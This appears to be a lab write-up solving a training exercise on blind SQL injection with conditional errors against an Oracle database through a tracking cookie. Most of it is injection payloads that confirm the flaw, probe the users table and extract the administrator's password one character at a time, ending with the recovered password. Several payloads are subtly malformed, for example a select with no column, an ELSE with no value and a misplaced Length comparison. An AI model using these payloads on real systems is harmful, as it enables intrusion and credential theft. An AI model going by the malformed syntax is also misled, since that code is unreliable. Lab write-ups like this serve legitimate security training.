# Lab-12 SQL Injection

## Blind SQL injection with conditional errors

### Problem

- This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

- The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

- The database contains a different table called users, with columns called `username and password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

- To solve the lab, log in as the `administrator` user.

### Solution

- Intercept with burpsuite and share the request to the repeater
- Prove that parameter is vulnerable

```SQL
'|| (select from dual) ||';
--oracle database
'|| (select from dualfiewjfow) ||';
-- error
```
- Confirm that the users table exists in the database

```
'||(select '' from users where rownum =1) ||' 
--users table exists
```
- Confirm that the administrator user exists in the users database

```
'||(select '' from users where username='administrator')||'
'||(select '' from users where username='administratoruiwj')||'
-- Both requests return a 200 OK because the SQL syntax itself is perfectly valid in both cases.
-- When you look for username='administrator', the database looks in the table. If it finds it, it selects '' (an empty string).When you look for username='administrator9000ks', the database looks in the table. It finds nothing, so it selects nothing.
-- So we use CASE method
'|| (SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE END FROM dual) ||'
'|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-- If the USER exit the web page throw a error
```
- Now we Enumurate the Length of password and the password of administrator Using substring method 

```Sql
'|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and Length(password>1)) ||'
'|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and Length(password>50)) ||'
-- So the password is >1 and <50 so we can send to intruder and find the exact Length
'|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and Length(password>$1$)) ||'
-- Length is 20 
'|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and substr(password,1,1)='c')||'
-- Again send to intruder to find the password
'|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and substr(password,$1$,1)='$c$')||'
-- 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 
-- z a e 4 5 f c 6 x k  w  w  E  e  W  w  2  4  7  S
```

- Lab Solved!!!

